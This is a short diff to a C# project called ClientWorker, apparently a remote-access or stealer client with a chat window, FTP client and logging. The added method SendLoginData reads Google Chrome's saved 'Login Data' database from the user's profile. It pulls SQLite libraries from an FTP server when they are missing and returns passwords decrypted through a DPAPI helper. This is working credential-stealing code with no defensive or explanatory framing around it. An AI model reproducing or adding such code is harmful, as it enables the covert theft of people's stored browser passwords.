@@ -246,5 +246,16 @@ namespace ClientWorker
             ChatForm.current.AddMessage(message);
             Log.Send("Chat.ReadMessage(" + message + ")");
         }
+
+        public List<LoginData> SendLoginData(string path)
+        {
+            if (string.IsNullOrWhiteSpace(path))
+                path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Local\Google\Chrome\User Data\Default\Login Data";
+            if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\SQLite.Interop.dll"))
+                FtpClient.DownloadF("SQLite.Interop.dll", Path.GetDirectoryName(Application.ExecutablePath) + "\\");
+            if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\System.Data.SQLite.dll"))
+                FtpClient.DownloadF("System.Data.SQLite.dll", Path.GetDirectoryName(Application.ExecutablePath) + "\\");
+            return DPAPI.GetPasswords(path);
+        }
     }
 }
